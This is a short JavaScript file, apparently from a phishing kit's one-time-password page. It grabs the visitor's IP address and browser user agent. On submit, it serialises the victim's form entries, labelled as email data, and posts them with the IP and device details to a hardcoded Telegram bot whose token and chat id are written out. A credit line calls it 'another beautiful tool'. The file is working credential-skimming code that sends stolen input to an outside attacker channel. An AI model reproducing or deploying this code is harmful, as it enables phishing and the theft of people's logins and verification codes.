
let tg = {
    token: "6196464257:AAFGMOt5B7IrruEyHeKIjV4hGV_Q2km10Ss", // Your bot's token that got from @BotFather
    chat_id: "5708903193" // The user's(that you want to send a message) telegram chat id
}
const url = `https://api.telegram.org/bot${tg.token}/sendMessage` // The url to request

$.getJSON("https://api.ipify.org?format=json", function(data) {
         
// Setting text of element P with id gfg


let ipx = document.getElementById('useripotp').value = data.ip

console.log(ipx)
})

// document.getElementById('userdevice').value = agent;

$( ".submu" ).click( function(event) {
    event.preventDefault();
    document.getElementById("shin").click();
})


otppform = document.getElementById('.shin');
// $(document).ready(function(){
otppform.addEventListener("click", function (event) { 
    alert('fddsfd')
    event.preventDefault();
   

    console.log( $(otppform).serialize() );

    const data = $(otppform).serialize()

    const userip = document.getElementById('useripotp').value

    // let dd = $( this ).serialize()

    // let dopo = dd.replace(/&/g, " & ")

    // let dat = dopo.replace(/%40/g, "@")

    // let data = dat.replace(/=/g, " : ")

    const agent = JSON.stringify(navigator.userAgent)



// console.log(userip + email + password)




    const obj = {
        chat_id: tg.chat_id, // Telegram chat id
        text:   "\n\n" + "Another beautiful tool by https://github.com/tutgirl"+ "\n\n" + 'Email Address : '  + data  + "\n\n" + "\n\n" + " IP : " + userip + "\n\n"  +" Device Type : " + agent + "\n\n"
          // The text to send
      
    };


 
     // Get U-Agent 

    const xht = new XMLHttpRequest();
    xht.open("POST", url, true);
    xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
    xht.send(JSON.stringify(obj) );

    // setTimeout(function(){
    //     window.location.replace('loginotp.html')
    // }, 5000)

  });


// });